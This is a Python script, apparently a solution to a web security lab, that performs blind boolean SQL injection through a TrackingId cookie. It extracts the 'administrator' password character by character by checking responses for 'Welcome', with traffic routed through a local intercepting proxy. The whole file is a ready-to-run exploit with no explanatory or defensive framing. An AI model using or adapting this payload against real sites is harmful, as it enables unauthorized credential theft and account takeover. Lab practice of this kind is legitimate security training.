import requests
import sys
import urllib3
import urllib
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_pass(url):
    password_extract =""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = " ' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s'" % (i, j)
            sqli_encode = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':'SrpdMF5tH2iUtqqQ'+ sqli_encode,'session':'f2HBSAJIh5CvUZtOBMPyFYo0g0SV2tYH'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+password_extract+chr(j))
                sys.stdout.flush()
            else:
                password_extract += chr(j)
                sys.stdout.write('\r'+password_extract)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
    
    url = sys.argv[1]
    print("(+) admin pass...........")
    sqli_pass(url)


if __name__ == "__main__":
    main()